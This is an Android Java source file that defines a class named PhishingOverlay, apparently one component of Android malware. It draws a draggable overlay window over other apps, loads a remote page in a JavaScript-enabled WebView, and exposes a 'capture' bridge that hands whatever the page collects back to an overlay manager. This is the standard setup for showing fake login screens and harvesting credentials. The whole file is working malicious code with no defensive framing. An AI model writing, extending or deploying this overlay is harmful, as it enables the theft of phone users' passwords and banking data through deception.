package com.fason.app.features.overlay;

import android.content.Context;
import android.graphics.PixelFormat;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;
import android.widget.TextView;

@SuppressWarnings("deprecation")
final class PhishingOverlay {
    private static final String TAG = "PhishingOverlay";

    private final WindowManager wm;
    private final LinearLayout root;
    private final WebView webView;
    private final WindowManager.LayoutParams params;
    private final Runnable onClose;
    private boolean attached = false;

    PhishingOverlay(Context context, String url, String title, boolean closeable,
                    int widthPct, int heightPct, Runnable onClose) {
        this.wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        this.onClose = onClose;

        int pad = dp(context, 10);
        root = new LinearLayout(context);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(pad, pad, pad, pad);
        GradientDrawable bg = new GradientDrawable();
        bg.setColor(0xFF0F1318);
        bg.setCornerRadius(dp(context, 18));
        bg.setStroke(dp(context, 1), 0xFF2A3441);
        root.setBackground(bg);

        boolean hasHeader = (title != null && !title.isEmpty()) || closeable;
        if (hasHeader) {
            LinearLayout header = new LinearLayout(context);
            header.setOrientation(LinearLayout.HORIZONTAL);
            header.setGravity(Gravity.CENTER_VERTICAL);
            header.setPadding(0, 0, 0, dp(context, 10));
            if (title != null && !title.isEmpty()) {
                TextView tv = new TextView(context);
                tv.setText(title);
                tv.setTextColor(0xFFE2E8F0);
                tv.setTextSize(15);
                tv.setMaxLines(1);
                tv.setSingleLine(true);
                tv.setEllipsize(android.text.TextUtils.TruncateAt.END);
                tv.setLayoutParams(new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f));
                header.addView(tv);
            }
            if (closeable) {
                TextView close = new TextView(context);
                close.setText("✕");
                close.setTextColor(0xFF94A3B8);
                close.setTextSize(18);
                close.setPadding(dp(context, 8), 0, dp(context, 2), 0);
                close.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        if (onClose != null) onClose.run();
                        detach();
                    }
                });
                header.addView(close);
            }
            header.setOnTouchListener(dragListener);
            root.addView(header, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT));
        }

        webView = new WebView(context);
        WebSettings s = webView.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setAllowFileAccess(false);
        s.setAllowContentAccess(false);
        s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        webView.setBackgroundColor(0xFF0F1318);
        webView.setWebViewClient(new WebViewClient());
        webView.setWebChromeClient(new WebChromeClient());
        webView.addJavascriptInterface(new JsBridge(), "AndroidBridge");
        webView.loadUrl(url);
        root.addView(webView, new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f));

        DisplayMetrics dm = context.getResources().getDisplayMetrics();
        int w = Math.max(1, dm.widthPixels * widthPct / 100);
        int h = Math.max(1, dm.heightPixels * heightPct / 100);
        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
            ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            : WindowManager.LayoutParams.TYPE_PHONE;
        int flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
            | WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED;
        params = new WindowManager.LayoutParams(w, h, type, flags, PixelFormat.TRANSLUCENT);
        params.gravity = Gravity.TOP | Gravity.CENTER_HORIZONTAL;
        params.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE;
    }

    private final View.OnTouchListener dragListener = new View.OnTouchListener() {
        private float downRawX, downRawY;
        private int startX, startY;

        @Override
        public boolean onTouch(View v, MotionEvent e) {
            switch (e.getActionMasked()) {
                case MotionEvent.ACTION_DOWN:
                    downRawX = e.getRawX();
                    downRawY = e.getRawY();
                    startX = params.x;
                    startY = params.y;
                    return true;
                case MotionEvent.ACTION_MOVE:
                    params.x = startX + (int) (e.getRawX() - downRawX);
                    params.y = startY + (int) (e.getRawY() - downRawY);
                    try { wm.updateViewLayout(root, params); } catch (Exception ignored) {}
                    return true;
                case MotionEvent.ACTION_UP:
                case MotionEvent.ACTION_CANCEL:
                    return true;
            }
            return false;
        }
    };

    void attach() {
        if (attached) return;
        try {
            wm.addView(root, params);
            attached = true;
        } catch (Exception e) {
            Log.w(TAG, "addView failed", e);
        }
    }

    void detach() {
        if (!attached) return;
        try { wm.removeView(root); } catch (Exception ignored) {}
        attached = false;
        try { webView.stopLoading(); } catch (Exception ignored) {}
        try { webView.destroy(); } catch (Exception ignored) {}
    }

    boolean isAttached() { return attached; }

    private static int dp(Context c, int v) {
        return Math.round(v * c.getResources().getDisplayMetrics().density);
    }

    private final class JsBridge {
        @JavascriptInterface
        public void capture(String json) {
            OverlayManager.getInstance().onCapture(json);
        }
    }
}
